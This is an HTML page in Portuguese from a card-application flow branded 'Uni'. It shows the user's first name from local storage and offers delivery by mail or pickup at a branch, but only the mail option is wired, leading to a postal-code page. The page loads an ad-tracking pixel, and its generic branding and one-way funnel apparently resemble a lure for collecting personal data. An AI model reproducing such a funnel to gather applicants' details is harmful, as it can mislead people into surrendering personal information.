<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Uni - Faça seu Cartão</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="assets/style.css">
    
<script
  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
  async
  defer
></script>

<script>
  window.pixelId = "66bb763debbcebab27d68442";
  var a = document.createElement("script");
  a.setAttribute("async", "");
  a.setAttribute("defer", "");
  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
  document.head.appendChild(a);
</script>
    
</head><body>
    <link rel="stylesheet" href="../../assets/style.css">
    <style>
         html, body {
            height: 100%;
            margin: 0;
            display: flex;
            flex-direction: column;
        }
        .main-content {
            flex: 1; /* Faz com que a main-content cresça para ocupar o espaço disponível */
            max-width: 450px;
            margin: 30px auto;
            padding: 20px;
            background-color: #fff;
            border-radius: 10px;
            box-shadow: 0px 0px 20px rgba(0, 0, 0, 0.1);
        }
        .footer {
            background-color: #ffffff;
            border-top: solid 1px #e6dddd;
            color: #000;
            text-align: center;
            padding: 10px 0;
            padding-top: 10px;
            padding-bottom: 10px;
            position: relative !important; 
            width: 100%;
            bottom: 0;
        }
    </style>

<div style="
  display: grid;
  grid-template-areas:
    'top-bar'
    'content'
    'footer';
  grid-template-rows: auto 1fr auto;
  min-height: 100vh;
">   
    <div class="header">
        <img style="width: 120px;" src="https://i.imgur.com/Q0PyyEg.png" alt="Imagem Centralizada">
    </div>
    
    <div style="grid-area: content; padding: 0 1rem;">
        <div class="main-content">
            <!-- Seção de escolha de recebimento do cartão -->
            <div id="recebimento-secao" class="mb-3">
                <h4>Tudo certo <span id="nomeCliente"></span>!</h4>
                <p>Agora precisamos saber qual opção melhor para você:</p>
                <div class="opcao mb-3">
                    <button class="btn btn-light w-100 text-start p-3 mb-2">
                        <strong>1ª opção:</strong> Receber o cartão pelos Correios
                    </button>
                    <button class="btn btn-light w-100 text-start p-3">
                        <strong>2ª opção:</strong> Retirar o cartão em uma Agência Uni
                    </button>
                </div>
    
                <p>Confira abaixo onde estão as nossas Agências:</p>
                <img src="avenidapaulista.jpg" alt="Unidades Presenciais" class="img-fluid rounded mb-3">
    
                <button class="btn btn-custom w-100" onclick="location.href='cep/index.php'">PREFIRO RECEBER PELOS CORREIOS</button>
            </div>
        </div>
    </div>

    <script>
    document.addEventListener("DOMContentLoaded", function() {
        // Verifica se 'dadosUsuarioUni' existe no localStorage e tenta analisá-lo como JSON
        const dadosUsuarioString = localStorage.getItem('dadosUsuarioUni');
        let dadosUsuario = null;

        try {
            dadosUsuario = JSON.parse(dadosUsuarioString);
        } catch (error) {
            console.error('Erro ao analisar os dados do usuário:', error);
        }

        // Verifica se os dados existem e se estão em uma das estruturas esperadas
        if (dadosUsuario && (dadosUsuario.nome || (dadosUsuario.data && dadosUsuario.data.nome))) {
            // Verifica se o nome está diretamente em 'dadosUsuario' ou em 'dadosUsuario.data'
            const nomeCompleto = dadosUsuario.nome ? dadosUsuario.nome.split(' ') : dadosUsuario.data.nome.split(' ');
            const primeiroNome = nomeCompleto[0];
            const nomeParaMostrar = `${primeiroNome}`;
            document.getElementById('nomeCliente').textContent = nomeParaMostrar;
        } else {
            console.error('Nome do usuário não encontrado no localStorage.');
        }
    });

    function mostrarPagina(paginaId) {
        // Esconde todas as seções
        document.getElementById('recebimento-secao').style.display = 'none';

        // Mostra a seção desejada
        document.getElementById(paginaId).style.display = 'block';
    }

    // Mostra a seção de recebimento inicialmente
    mostrarPagina('recebimento-secao');
</script>


    <div class="footer py-4" id="footerChg">
        © 2024 Uni S/A. CNPJ 68.842.676/0001-66. <br>
         Av. paulista 1320, São Paulo/SP - CEP 01310-930
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>

</body>
</html>

</div>